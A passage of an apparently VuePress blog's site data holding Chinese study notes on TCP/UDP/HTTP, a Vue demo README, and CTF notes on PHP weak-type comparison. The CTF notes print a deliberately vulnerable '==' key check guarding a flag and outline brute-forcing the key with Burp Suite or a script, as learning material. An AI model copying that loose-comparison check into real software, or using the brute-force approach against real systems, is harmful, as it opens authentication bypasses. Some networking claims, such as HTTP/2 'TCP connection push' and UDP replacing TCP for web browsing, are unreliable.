20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"TCP,UDP,HTTP的认识",frontmatter:{title:"TCP,UDP,HTTP的认识",date:"2018-01-16T00:00:00.000Z",tags:["网络协议"],categories:["前端 Front-end","规范 Standard"],isShowComments:!1},regularPath:"/views/frontend/TCP&UDP.html",relativePath:"views/frontend/TCP&UDP.md",key:"v-4a4946fa",path:"/views/frontend/TCP&UDP.html",headers:[{level:2,title:"TCP",slug:"tcp",normalizedTitle:"tcp",charIndex:0},{level:3,title:"TCP三次握手 ★",slug:"tcp三次握手-★",normalizedTitle:"tcp三次握手 ★",charIndex:70},{level:3,title:"为什么TCP客户端最后还要发送一次确认呢？",slug:"为什么tcp客户端最后还要发送一次确认呢",normalizedTitle:"为什么tcp客户端最后还要发送一次确认呢？",charIndex:85},{level:2,title:"UDP",slug:"udp",normalizedTitle:"udp",charIndex:4},{level:2,title:"TCP和UDP区别",slug:"tcp和udp区别",normalizedTitle:"tcp和udp区别",charIndex:117},{level:2,title:"TCP与UDP的适用场景",slug:"tcp与udp的适用场景",normalizedTitle:"tcp与udp的适用场景",charIndex:130},{level:2,title:"WebSocket",slug:"websocket",normalizedTitle:"websocket",charIndex:146},{level:2,title:"HTTP",slug:"http",normalizedTitle:"http",charIndex:32},{level:3,title:"HTTP 协议格式",slug:"http-协议格式",normalizedTitle:"http 协议格式",charIndex:169},{level:3,title:"HTTP Method",slug:"http-method",normalizedTitle:"http method",charIndex:184},{level:3,title:"HTTP Status code和Status text",slug:"http-status-code和status-text",normalizedTitle:"http status code和status text",charIndex:201},{level:3,title:"HTTP Head (HTTP 头)",slug:"http-head-http-头",normalizedTitle:"http head (http 头)",charIndex:235},{level:3,title:"HTTP Request Body",slug:"http-request-body",normalizedTitle:"http request body",charIndex:259},{level:2,title:"HTTPS",slug:"https",normalizedTitle:"https",charIndex:280},{level:2,title:"HTTP2",slug:"http2",normalizedTitle:"http2",charIndex:289}],excerpt:"<Boxx/>\n<p>TCP/UDP协议是<strong>传输层协议</strong>，主要解决数据如何在网络中传输，而HTTP是<strong>应用层协议</strong>，主要解决如何包装数据。</p>\n",headersStr:"TCP TCP三次握手 ★ 为什么TCP客户端最后还要发送一次确认呢？ UDP TCP和UDP区别 TCP与UDP的适用场景 WebSocket HTTP HTTP 协议格式 HTTP Method HTTP Status code和Status text HTTP Head (HTTP 头) HTTP Request Body HTTPS HTTP2",content:"TCP/UDP协议是传输层协议，主要解决数据如何在网络中传输，而HTTP是应用层协议，主要解决如何包装数据。\n\n\n\n * TCP\n   * TCP三次握手 ★\n   * 为什么TCP客户端最后还要发送一次确认呢？\n * UDP\n * TCP和UDP区别\n * TCP与UDP的适用场景\n * WebSocket\n * HTTP\n   * HTTP 协议格式\n   * HTTP Method\n   * HTTP Status code和Status text\n   * HTTP Head (HTTP 头)\n   * HTTP Request Body\n * HTTPS\n * HTTP2\n\n\n\n简单理解： “IP”代表网际协议，TCP和UDP使用该协议从一个网络传送数据包到另一个网络。把IP想像成一种高速公路，它允许其它协议在上面行驶并找到到其它电脑的出口。TCP和UDP是高速公路上的卡车，它们携带的货物就是像HTTP，文件传输协议FTP这样的协议等。\n\n当然还有像SOCKET这种抽象层：TCP/IP网络的API。Socket（相当于码头/车站）是应用层与TCP/IP协议族通信的中间软件抽象层，它是一组接口。socket是在应用层和传输层之间的一个抽象层，它把TCP/IP层复杂的操作抽象为几个简单的接口供应用层调用已实现进程在网络中通信。\n\nTCP提供有保证的数据传输，UDP不提供，而HTTP就是基于TCP实现的应用层协议。\n\n\n# TCP\n\nTCP是一种面向连接的、可靠的传输层协议；\n\nTCP协议建立在不可靠的网络层 IP 协议之上，IP协议并不能提供任何可靠性机制，TCP的可靠性完全由自己实现；\n\nTCP采用的最基本的可靠性技术是：确认与超时重传机制、流量控制机制（别发的太快已保证对方能收到）；\n\n\n# TCP三次握手 ★\n\n* 第一次握手：客户端向服务器发送请求报文段，其中同步位SYN=1，序号SEQ=x（表明传送数据时的第一个数据字节的序号是x），等待服务器确认；\n\n* 第二次握手：服务器收到客户端发来的请求，如果同意建立连接，就发回一个确认报文段，该报文段中同步位SYN=1，确认号ACK=x+1，序号SEQ=y；\n\n* 第三次握手：客户端收到服务器的确认报文段后，还需要向服务器给出确认，向其发送确认包ACK(ack=y+1)，进而完成三次握手。\n\n\n# 为什么TCP客户端最后还要发送一次确认呢？\n\n一句话，主要防止已经失效的连接请求报文突然又传送到了服务器，从而产生错误。\n\n如果使用的是两次握手建立连接，假设有这样一种场景，客户端发送了第一个请求连接并且没有丢失，只是因为在网络结点中滞留的时间太长了，由于TCP的客户端迟迟没有收到确认报文，以为服务器没有收到，此时重新向服务器发送这条报文，此后客户端和服务器经过两次握手完成连接，传输数据，然后关闭连接。此时此前滞留的那一次请求连接，网络通畅了到达了服务器，这个报文本该是失效的，但是，两次握手的机制将会让客户端和服务器再次建立连接，这将导致不必要的错误和资源的浪费。\n\n如果采用的是三次握手，就算是那一次失效的报文传送过来了，服务端接受到了那条失效报文并且回复了确认报文，但是客户端不会再次发出确认。由于服务器收不到确认，就知道客户端并没有请求连接。\n\n\n# UDP\n\nUDP是一种无连接的、不可靠的传输层协议； 提供了有限的差错检验功能；目的是希望以最小的开销来达到网络环境中的进程通信目的。\n\nUDP（用户数据报协议）- 类似发短信：\n\n 1. 只管发送，不确认对方是否接收到\n 2. 将数据及源和目的封装成数据包中，不需要建立连接\n 3. 每个数据包的大小限制在64K之内\n 4. 因为无需连接，因此是不可靠协议\n 5. 不需要建立连接，速度快\n\n随着现代网速的提升，UDP协议以其简单、传输快的优势，在越来越多场景下取代了TCP ， 如网页浏览、流媒体、实时游戏、物联网。\n\n\n# TCP和UDP区别\n\nTCP：\n\n面向连接、传输可靠（保证数据正确性）、有序（保证数据顺序）、传输大量数据（流模式）、速度慢、对系统资源的要求多，程序结构较复杂， 每一条TCP连接只能是点到点的， TCP首部开销20字节。\n\nUDP：\n\n面向非连接 、传输不可靠（可能丢包）、无序、传输少量数据（数据报模式）、速度快，对系统资源的要求少，程序结构较简单 ， UDP支持一对一，一对多，多对一和多对多的交互通信， UDP的首部开销小，只有8个字节。\n\n\n# TCP与UDP的适用场景\n\n 1. TCP用于在传输层有必要实现可靠传输的情况。\n\n 2. UDP主要用于那些对高速传输和实时性有较高要求的通信或广播通信。\n    \n    举一个通过 IP 电话进行通话的例子。如果使用 TCP，数据在传送途中如果丢失就会被重发，这样就会导致无法流畅地传输通话人的声音。而采用UDP，它不会进行重发处理，从而也就不会有声音大幅度延迟到达的问题，即使有部分数据丢失，也只是会影响某一小部分的通话。\n\n\n# WebSocket\n\n可以把WebSocket想象成HTTP(应用层)，HTTP和Socket什么关系，WebSocket和Socket就是什么关系。\n\nHTTP 协议有一个缺陷：通信只能由客户端发起，做不到服务器主动向客户端推送信息。\n\nWebSocket 协议在2008年诞生，2011年成为国际标准。所有浏览器都已经支持了。它的最大特点就是，服务器可以主动向客户端推送信息，客户端也可以主动向服务器发送信息，是真正的双向平等对话，属于服务器推送技术的一种。\n\n\n# HTTP\n\nHTTP 标准由 IETF 组织制定。\n\nHTTP 协议是基于 TCP 协议出现的，对 TCP 协议来说，TCP 协议是一条双向的通讯通道，HTTP 在 TCP 的基础上，规定了 Request-Response 模式。这个模式决定了通讯必定由浏览器端首先发起。\n\nHTTP 是存粹的文本协议，它是规定了使用 TCP 协议来传输文本格式的一个应用层协议。\n\n\n# HTTP 协议格式\n\n\n\n\n# HTTP Method\n\n * GET：浏览器通过地址栏访问页面都是 GET 方法。\n * POST：表单提交产生 POST 方法。\n * HEAD：HEAD 跟 GET 类似，只返回请求头，多数由 JavaScript 发起。\n * PUT：添加资源，语义上的约束。\n * DELETE ：删除资源，语义上的约束。\n * CONNECT：CONNECT 多用于 HTTPS 和 WebSocket。\n * OPTIONS：一般用于调试，多数线上服务都不支持。\n * TRACE：一般用于调试，多数线上服务都不支持。\n\n\n# HTTP Status code和Status text\n\n * 1xx：临时回应，表示客户端请继续，被浏览器 HTTP 库直接处理掉了，不会让上层应用知晓\n\n * 2xx：请求成功\n   \n   * 200：请求成功\n\n * 3xx：表示请求的目标由变化，希望客户端进一步处理\n   \n   * 301&302：当前资源已经被转移，永久性与临时性的转移。 301 更接近一种报错，提示客户端下次别来了。\n   * 304：客户端本地已经由缓存的版本，并且在 Request 中告诉了服务端，当服务端通过时间或者 tag，发现没有更新的时候，就会返回一个不含 body 的 304 状态。\n\n * 4xx：客户端请求错误\n   \n   * 403：无权限\n   * 404：表示请求的页面不存在\n\n * 5xx：服务端请求错误\n   \n   * 500：服务端错误\n   * 503：服务端暂时性错误，可以一会再试\n\n\n# HTTP Head (HTTP 头)\n\n> 可以看作键值对。\n\nRequest Header\n\nREQUEST HEADER      规定\nAccept              浏览器端接受的格式\nAccept-Encoding     浏览器端接受的编码方式\nAccpet-Language     浏览器端接受的语言，用于服务器端判断多语言\nCache-Control       控制缓存的时效性\nConnection          连接方式，如果是 keep-alive，且服务器端支持，则会复用连接\nHost                HTTP访问使用的域名\nIf-Modified-Since   上次访问时的更改时间，如果服务器认为此时间后自己没有更新，则会给出 304 响应\nIf-None-Match       上次访问时使用的 E-Tag，通常是页面的信息摘要，这个比更改时间更准确一些\nUser-Agent          客户端标识\nCookie              客户端存储的 Cookie 字符串\n\nResponse Header\n\nRESPONSE HEADER    规定\nCache-Control      缓存控制，用于通知各级缓存保存的时间，例如 max-age=0 表示不要缓存\nConnection         连接类型，Keep-Alive表示复用连接\nContent-Encoding   内容编码方式，通常是gzip\nContent-Length     内容的长度，有利于浏览器判断内容是否已经结束\nContent-Type       内容类型，所有请求网页的都是 text/html\nDate               当前的服务器日期\nETag               页面的信息摘要，用于判断是否需要重新到服务器端取回页面\nExpires            过期时间，用于判断下次请求是否需要到服务器端取回页面\nKeep-Alive         保持连接不断时需要的一些信息，如 timeout=5，max=100\nLast-Modified      页面上次修改的时间\nServer             服务器软件的类型\nSet-Cookie         设置 cookie 可以存在多个\nVia                服务器端的请求链路，对一些调试场景至关重要的一个头\n\n\n# HTTP Request Body\n\n> HTTP 请求的 body 主要用于提交表单场景。比较自由，服务端认可即可。\n\n常见的 body 格式：\n\n * application/json\n * application/x-www-form-urlencoded\n * multipart/form-data\n * text/xml\n\n使用 html 的 form 标签提交产生的 html 请求，默认会产生 application/x-www-form-urlencoded 数据格式，当由文件上传时，则使用 multipart/form-data。\n\n\n# HTTPS\n\n> 在 HTTP 协议的基础上，HTTPS 和 HTTP2 规定了更复杂的内容，但是它基本保持了 HTTP 的设计思想，即：使用上的 Request-Response 模式。\n\nHTTPS 作用：\n\n * 确定请求的目标服务端身份\n * 保证传输的数据不会被网络中间节点窃听或者篡改\n\nHTTPS 是使用加密通道来传输 HTTP 的内容。 HTTPS 首先与服务端建立一条 TLS 加密通道。TLS 构建于 TCP 协议之上，它实际上是对传输的内容做一次加密，所以从传输内容上看，HTTPS 跟 HTTP 没有任何区别。\n\n\n# HTTP2\n\n> HTTP 2 是 HTTP 1.1 的升级版本。\n\nHTTP 2.0 最大的改进有两点，一是支持服务端推送，二是支持 TCP 连接推送。\n\n服务端推送能够在客户端发送第一个请求到服务端时，提前把一部分内容推送给客户端，放入缓存中，可以避免客户端请求顺序带来的并行度不高，从而导致性能问题。\n\nTCP 连接复用，则使用同一个 TCP 连接来传输多个 HTTP 请求，避免了 TCP 连接建立时的三次握手开销，和初建 TCP 连接时传输窗口小的问题。",normalizedContent:"tcp/udp协议是传输层协议，主要解决数据如何在网络中传输，而http是应用层协议，主要解决如何包装数据。\n\n\n\n * tcp\n   * tcp三次握手 ★\n   * 为什么tcp客户端最后还要发送一次确认呢？\n * udp\n * tcp和udp区别\n * tcp与udp的适用场景\n * websocket\n * http\n   * http 协议格式\n   * http method\n   * http status code和status text\n   * http head (http 头)\n   * http request body\n * https\n * http2\n\n\n\n简单理解： “ip”代表网际协议，tcp和udp使用该协议从一个网络传送数据包到另一个网络。把ip想像成一种高速公路，它允许其它协议在上面行驶并找到到其它电脑的出口。tcp和udp是高速公路上的卡车，它们携带的货物就是像http，文件传输协议ftp这样的协议等。\n\n当然还有像socket这种抽象层：tcp/ip网络的api。socket（相当于码头/车站）是应用层与tcp/ip协议族通信的中间软件抽象层，它是一组接口。socket是在应用层和传输层之间的一个抽象层，它把tcp/ip层复杂的操作抽象为几个简单的接口供应用层调用已实现进程在网络中通信。\n\ntcp提供有保证的数据传输，udp不提供，而http就是基于tcp实现的应用层协议。\n\n\n# tcp\n\ntcp是一种面向连接的、可靠的传输层协议；\n\ntcp协议建立在不可靠的网络层 ip 协议之上，ip协议并不能提供任何可靠性机制，tcp的可靠性完全由自己实现；\n\ntcp采用的最基本的可靠性技术是：确认与超时重传机制、流量控制机制（别发的太快已保证对方能收到）；\n\n\n# tcp三次握手 ★\n\n* 第一次握手：客户端向服务器发送请求报文段，其中同步位syn=1，序号seq=x（表明传送数据时的第一个数据字节的序号是x），等待服务器确认；\n\n* 第二次握手：服务器收到客户端发来的请求，如果同意建立连接，就发回一个确认报文段，该报文段中同步位syn=1，确认号ack=x+1，序号seq=y；\n\n* 第三次握手：客户端收到服务器的确认报文段后，还需要向服务器给出确认，向其发送确认包ack(ack=y+1)，进而完成三次握手。\n\n\n# 为什么tcp客户端最后还要发送一次确认呢？\n\n一句话，主要防止已经失效的连接请求报文突然又传送到了服务器，从而产生错误。\n\n如果使用的是两次握手建立连接，假设有这样一种场景，客户端发送了第一个请求连接并且没有丢失，只是因为在网络结点中滞留的时间太长了，由于tcp的客户端迟迟没有收到确认报文，以为服务器没有收到，此时重新向服务器发送这条报文，此后客户端和服务器经过两次握手完成连接，传输数据，然后关闭连接。此时此前滞留的那一次请求连接，网络通畅了到达了服务器，这个报文本该是失效的，但是，两次握手的机制将会让客户端和服务器再次建立连接，这将导致不必要的错误和资源的浪费。\n\n如果采用的是三次握手，就算是那一次失效的报文传送过来了，服务端接受到了那条失效报文并且回复了确认报文，但是客户端不会再次发出确认。由于服务器收不到确认，就知道客户端并没有请求连接。\n\n\n# udp\n\nudp是一种无连接的、不可靠的传输层协议； 提供了有限的差错检验功能；目的是希望以最小的开销来达到网络环境中的进程通信目的。\n\nudp（用户数据报协议）- 类似发短信：\n\n 1. 只管发送，不确认对方是否接收到\n 2. 将数据及源和目的封装成数据包中，不需要建立连接\n 3. 每个数据包的大小限制在64k之内\n 4. 因为无需连接，因此是不可靠协议\n 5. 不需要建立连接，速度快\n\n随着现代网速的提升，udp协议以其简单、传输快的优势，在越来越多场景下取代了tcp ， 如网页浏览、流媒体、实时游戏、物联网。\n\n\n# tcp和udp区别\n\ntcp：\n\n面向连接、传输可靠（保证数据正确性）、有序（保证数据顺序）、传输大量数据（流模式）、速度慢、对系统资源的要求多，程序结构较复杂， 每一条tcp连接只能是点到点的， tcp首部开销20字节。\n\nudp：\n\n面向非连接 、传输不可靠（可能丢包）、无序、传输少量数据（数据报模式）、速度快，对系统资源的要求少，程序结构较简单 ， udp支持一对一，一对多，多对一和多对多的交互通信， udp的首部开销小，只有8个字节。\n\n\n# tcp与udp的适用场景\n\n 1. tcp用于在传输层有必要实现可靠传输的情况。\n\n 2. udp主要用于那些对高速传输和实时性有较高要求的通信或广播通信。\n    \n    举一个通过 ip 电话进行通话的例子。如果使用 tcp，数据在传送途中如果丢失就会被重发，这样就会导致无法流畅地传输通话人的声音。而采用udp，它不会进行重发处理，从而也就不会有声音大幅度延迟到达的问题，即使有部分数据丢失，也只是会影响某一小部分的通话。\n\n\n# websocket\n\n可以把websocket想象成http(应用层)，http和socket什么关系，websocket和socket就是什么关系。\n\nhttp 协议有一个缺陷：通信只能由客户端发起，做不到服务器主动向客户端推送信息。\n\nwebsocket 协议在2008年诞生，2011年成为国际标准。所有浏览器都已经支持了。它的最大特点就是，服务器可以主动向客户端推送信息，客户端也可以主动向服务器发送信息，是真正的双向平等对话，属于服务器推送技术的一种。\n\n\n# http\n\nhttp 标准由 ietf 组织制定。\n\nhttp 协议是基于 tcp 协议出现的，对 tcp 协议来说，tcp 协议是一条双向的通讯通道，http 在 tcp 的基础上，规定了 request-response 模式。这个模式决定了通讯必定由浏览器端首先发起。\n\nhttp 是存粹的文本协议，它是规定了使用 tcp 协议来传输文本格式的一个应用层协议。\n\n\n# http 协议格式\n\n\n\n\n# http method\n\n * get：浏览器通过地址栏访问页面都是 get 方法。\n * post：表单提交产生 post 方法。\n * head：head 跟 get 类似，只返回请求头，多数由 javascript 发起。\n * put：添加资源，语义上的约束。\n * delete ：删除资源，语义上的约束。\n * connect：connect 多用于 https 和 websocket。\n * options：一般用于调试，多数线上服务都不支持。\n * trace：一般用于调试，多数线上服务都不支持。\n\n\n# http status code和status text\n\n * 1xx：临时回应，表示客户端请继续，被浏览器 http 库直接处理掉了，不会让上层应用知晓\n\n * 2xx：请求成功\n   \n   * 200：请求成功\n\n * 3xx：表示请求的目标由变化，希望客户端进一步处理\n   \n   * 301&302：当前资源已经被转移，永久性与临时性的转移。 301 更接近一种报错，提示客户端下次别来了。\n   * 304：客户端本地已经由缓存的版本，并且在 request 中告诉了服务端，当服务端通过时间或者 tag，发现没有更新的时候，就会返回一个不含 body 的 304 状态。\n\n * 4xx：客户端请求错误\n   \n   * 403：无权限\n   * 404：表示请求的页面不存在\n\n * 5xx：服务端请求错误\n   \n   * 500：服务端错误\n   * 503：服务端暂时性错误，可以一会再试\n\n\n# http head (http 头)\n\n> 可以看作键值对。\n\nrequest header\n\nrequest header      规定\naccept              浏览器端接受的格式\naccept-encoding     浏览器端接受的编码方式\naccpet-language     浏览器端接受的语言，用于服务器端判断多语言\ncache-control       控制缓存的时效性\nconnection          连接方式，如果是 keep-alive，且服务器端支持，则会复用连接\nhost                http访问使用的域名\nif-modified-since   上次访问时的更改时间，如果服务器认为此时间后自己没有更新，则会给出 304 响应\nif-none-match       上次访问时使用的 e-tag，通常是页面的信息摘要，这个比更改时间更准确一些\nuser-agent          客户端标识\ncookie              客户端存储的 cookie 字符串\n\nresponse header\n\nresponse header    规定\ncache-control      缓存控制，用于通知各级缓存保存的时间，例如 max-age=0 表示不要缓存\nconnection         连接类型，keep-alive表示复用连接\ncontent-encoding   内容编码方式，通常是gzip\ncontent-length     内容的长度，有利于浏览器判断内容是否已经结束\ncontent-type       内容类型，所有请求网页的都是 text/html\ndate               当前的服务器日期\netag               页面的信息摘要，用于判断是否需要重新到服务器端取回页面\nexpires            过期时间，用于判断下次请求是否需要到服务器端取回页面\nkeep-alive         保持连接不断时需要的一些信息，如 timeout=5，max=100\nlast-modified      页面上次修改的时间\nserver             服务器软件的类型\nset-cookie         设置 cookie 可以存在多个\nvia                服务器端的请求链路，对一些调试场景至关重要的一个头\n\n\n# http request body\n\n> http 请求的 body 主要用于提交表单场景。比较自由，服务端认可即可。\n\n常见的 body 格式：\n\n * application/json\n * application/x-www-form-urlencoded\n * multipart/form-data\n * text/xml\n\n使用 html 的 form 标签提交产生的 html 请求，默认会产生 application/x-www-form-urlencoded 数据格式，当由文件上传时，则使用 multipart/form-data。\n\n\n# https\n\n> 在 http 协议的基础上，https 和 http2 规定了更复杂的内容，但是它基本保持了 http 的设计思想，即：使用上的 request-response 模式。\n\nhttps 作用：\n\n * 确定请求的目标服务端身份\n * 保证传输的数据不会被网络中间节点窃听或者篡改\n\nhttps 是使用加密通道来传输 http 的内容。 https 首先与服务端建立一条 tls 加密通道。tls 构建于 tcp 协议之上，它实际上是对传输的内容做一次加密，所以从传输内容上看，https 跟 http 没有任何区别。\n\n\n# http2\n\n> http 2 是 http 1.1 的升级版本。\n\nhttp 2.0 最大的改进有两点，一是支持服务端推送，二是支持 tcp 连接推送。\n\n服务端推送能够在客户端发送第一个请求到服务端时，提前把一部分内容推送给客户端，放入缓存中，可以避免客户端请求顺序带来的并行度不高，从而导致性能问题。\n\ntcp 连接复用，则使用同一个 tcp 连接来传输多个 http 请求，避免了 tcp 连接建立时的三次握手开销，和初建 tcp 连接时传输窗口小的问题。",charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"关于Vue的学习",frontmatter:{title:"关于Vue的学习",catalog:!0,date:"2019-05-12T13:59:44.000Z",tags:["Vue"],categories:["前端 Front-end"],isShowComments:!1},regularPath:"/views/frontend/vue-demo.html",relativePath:"views/frontend/vue-demo.md",key:"v-9866f964",path:"/views/frontend/vue-demo.html",headers:[{level:2,title:"Vue-Demo",slug:"vue-demo",normalizedTitle:"vue-demo",charIndex:3},{level:2,title:"主要完成的功能",slug:"主要完成的功能",normalizedTitle:"主要完成的功能",charIndex:15},{level:2,title:"图形界面展示",slug:"图形界面展示",normalizedTitle:"图形界面展示",charIndex:26},{level:2,title:"感谢",slug:"感谢",normalizedTitle:"感谢",charIndex:36}],headersStr:"Vue-Demo 主要完成的功能 图形界面展示 感谢",content:" * Vue-Demo\n * 主要完成的功能\n * 图形界面展示\n * 感谢\n\n\n\n\n# Vue-Demo\n\n * 这是在学习Vue的同时，写的一个demo\n\n * 项目地址：https://github.com/zpj80231/vue-demo\n   \n   > 点击右上角克隆或下载 下载完成之后，在vue-demo文件目录打开命令窗口 输入命令： npm install （需提前装好node.js环境，如果没有请自行百度） 待npm安装完成之后输入： npm run dev 即可在浏览器看到窗口界面\n\n\n# 主要完成的功能\n\n * 新闻资讯\n   * 新闻资讯列表\n   * 新闻资讯列表详情\n   * 新闻评论功能\n * 图片分享\n   * 图片列表\n   * 图片缩略图功能\n * 商品购买\n   * 经典商品列表布局\n   * 商品详情页面\n   * 添加购物车\n * 购物车（难点）\n\n\n# 图形界面展示\n\n\n# 感谢\n\n * bilibili: vue教程-黑马-205集完整版\n\n * bilibili: hulala赵四(我用的是他的接口)\n\n> http://www.liulongbin.top:3005\n\n * bilibili: 有点小岁\n\n> 服务器：https://github.com/arm-liang/vue-mobbile-server\n> \n> 客户端：https://github.com/arm-liang/vue-mobbile-learning\n> \n> 项目服务器接口： http://120.77.181.41:3000，具体API 接口看GITHUB\n> \n> 项目演示： http://120.77.181.41/vue-learn/",normalizedContent:" * vue-demo\n * 主要完成的功能\n * 图形界面展示\n * 感谢\n\n\n\n\n# vue-demo\n\n * 这是在学习vue的同时，写的一个demo\n\n * 项目地址：https://github.com/zpj80231/vue-demo\n   \n   > 点击右上角克隆或下载 下载完成之后，在vue-demo文件目录打开命令窗口 输入命令： npm install （需提前装好node.js环境，如果没有请自行百度） 待npm安装完成之后输入： npm run dev 即可在浏览器看到窗口界面\n\n\n# 主要完成的功能\n\n * 新闻资讯\n   * 新闻资讯列表\n   * 新闻资讯列表详情\n   * 新闻评论功能\n * 图片分享\n   * 图片列表\n   * 图片缩略图功能\n * 商品购买\n   * 经典商品列表布局\n   * 商品详情页面\n   * 添加购物车\n * 购物车（难点）\n\n\n# 图形界面展示\n\n\n# 感谢\n\n * bilibili: vue教程-黑马-205集完整版\n\n * bilibili: hulala赵四(我用的是他的接口)\n\n> http://www.liulongbin.top:3005\n\n * bilibili: 有点小岁\n\n> 服务器：https://github.com/arm-liang/vue-mobbile-server\n> \n> 客户端：https://github.com/arm-liang/vue-mobbile-learning\n> \n> 项目服务器接口： http://120.77.181.41:3000，具体api 接口看github\n> \n> 项目演示： http://120.77.181.41/vue-learn/",charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"20241205CTF学习笔记2",frontmatter:{title:"20241205CTF学习笔记2",date:"2024-12-05T00:00:00.000Z",tags:["CTF","CTFLearn"],categories:["命理学 Numerology"],isShowComments:!0,publish:!0},regularPath:"/views/numerology/2024-12-05-CTFLearn.html",relativePath:"views/numerology/2024-12-05-CTFLearn.md",key:"v-47970b78",path:"/views/numerology/2024-12-05-CTFLearn.html",headers:[{level:4,title:"弱比较",slug:"弱比较",normalizedTitle:"弱比较",charIndex:90},{level:3,title:"弱类型",slug:"弱类型",normalizedTitle:"弱类型",charIndex:43}],excerpt:'<Boxx/>\n<p>从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第20天</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>视频地址【<a href="https://www.bilibili.com/video/BV1Lh411F7s8/" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n</ul>\n',headersStr:"弱比较 弱类型",content:'从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第20天\n\n\n\n * 弱类型\n\n\n\n * 视频地址【传送门】\n\n\n# 第2章：web基础题-01-弱类型问题\n\n# 弱比较\n\n在PHP中，有两种相等比较\n\n符号    名称     判断方式\n===   严格相等   会先判断两种字符串的类型是否相等，再比较\n==    弱相等    会先将字符串类型转化为相同，再比较\n\n<?php\n\tvar_dump("admin" == 0); //true\n\tvar_dump("1admin" == 1); //ture\n\tvar_dump("admin1"==1);//false\n\tvar_dump("admin1"==0);//true\n\tvar_dump("0e123456"=="0e456789");//ture 字符串相比较不需要转化为数字，e是科学计数法，意思0*10多少次方\n?>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n记住转换规则，先看第一位是不是数字，如果是数字就转，不是数字以后就直接把后边扔掉\n\neg：123admin转换后就是123\n\neg：admin转化后就是0\n\n\n# 弱类型\n\n当一个字符串被当作一个数值来取值，其结果和类型如下：如果该字符串没有包含\'.\',\'e\',\'E\'并且其数值值在整形的范围内，该字符串被当作int来取值，其他所有情况下都被当作float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，泽使用该数组，否则其值为0\n\n注：就是说正常情况下的字符串可以做加法，会被转化为数字，加和的结果会是float。非正常情况下会数字加上带字母的字符串再加和，得到的结果会是int\n\n<?php\n\t$test=1+"10.5";//$test=11.5(float)\n\t$test=1+"-1.3e3";//$test=-1299(float) 浮点数 1+(-1300)\n\t$test=1+"bob-1.3e3";//$test=1(int)\n\t$test=1+"2admin";//$test=3(int)\n\t$test=1+"admin2";//$test=1(int)\n?>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n升级版-练习题\n\nif(isset($_POST[\'message\'])){\n    $message = json_decode($_POST[\'message\']);\n    $key = "*******"; //保密\n    if ($message->key == $key){\n\t\techo "flag";\n    }\n    else {\n        echo "fail";\n    }\n}else{\n    echo "~~~";\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n需要用POST方法，传入一个JSON格式的参数，要和key弱类型比较相等\n\n这里首先可以猜测这个$key的开头不是数字，当然这种方法并不保险，我们可以用burpsuite爆破，给这个地址传入一个叫message的参数，参数的值是一个JSON格式的字符串{"key":"xxxx"}，将这个xxxx替换为我们的字典，即可找到$keyd对应的值。或者用Python来写一个脚本，用request库写一个for循环，从0开始一次一次去请求。\n\n\n\n上图是松散比较图\n\n\n\n上图是严格比较图',normalizedContent:'从0开始学习ctf，了解ctf基本规则、方法，这是开始打卡学习的第20天\n\n\n\n * 弱类型\n\n\n\n * 视频地址【传送门】\n\n\n# 第2章：web基础题-01-弱类型问题\n\n# 弱比较\n\n在php中，有两种相等比较\n\n符号    名称     判断方式\n===   严格相等   会先判断两种字符串的类型是否相等，再比较\n==    弱相等    会先将字符串类型转化为相同，再比较\n\n<?php\n\tvar_dump("admin" == 0); //true\n\tvar_dump("1admin" == 1); //ture\n\tvar_dump("admin1"==1);//false\n\tvar_dump("admin1"==0);//true\n\tvar_dump("0e123456"=="0e456789");//ture 字符串相比较不需要转化为数字，e是科学计数法，意思0*10多少次方\n?>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n记住转换规则，先看第一位是不是数字，如果是数字就转，不是数字以后就直接把后边扔掉\n\neg：123admin转换后就是123\n\neg：admin转化后就是0\n\n\n# 弱类型\n\n当一个字符串被当作一个数值来取值，其结果和类型如下：如果该字符串没有包含\'.\',\'e\',\'e\'并且其数值值在整形的范围内，该字符串被当作int来取值，其他所有情况下都被当作float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，泽使用该数组，否则其值为0\n\n注：就是说正常情况下的字符串可以做加法，会被转化为数字，加和的结果会是float。非正常情况下会数字加上带字母的字符串再加和，得到的结果会是int\n\n<?php\n\t$test=1+"10.5";//$test=11.5(float)\n\t$test=1+"-1.3e3";//$test=-1299(float) 浮点数 1+(-1300)\n\t$test=1+"bob-1.3e3";//$test=1(int)\n\t$test=1+"2admin";//$test=3(int)\n\t$test=1+"admin2";//$test=1(int)\n?>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n升级版-练习题\n\nif(isset($_post[\'message\'])){\n    $message = json_decode($_post[\'message\']);\n    $key = "*******"; //保密\n    if ($message->key == $key){\n\t\techo "flag";\n    }\n    else {\n        echo "fail";\n    }\n}else{\n    echo "~~~";\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n需要用post方法，传入一个json格式的参数，要和key弱类型比较相等\n\n这里首先可以猜测这个$key的开头不是数字，当然这种方法并不保险，我们可以用burpsuite爆破，给这个地址传入一个叫message的参数，参数的值是一个json格式的字符串{"key":"xxxx"}，将这个xxxx替换为我们的字典，即可找到$keyd对应的值。或者用python来写一个脚本，用request库写一个for循环，从0开始一次一次去请求。\n\n\n\n上图是松散比较图\n\n\n\n上图是严格比较图',charsets:{cjk:!0},lastUpdated:"2024/12/13, 23:38:47",lastUpdatedTimestamp:1734104327e3},{title:"20241204CTF学习笔记1",frontmatter:{title:"20241204CTF学习笔记1",date:"2024-12-04T00:00:00.000Z",tags:["CTF","CTFLearn"],categories:["命理学 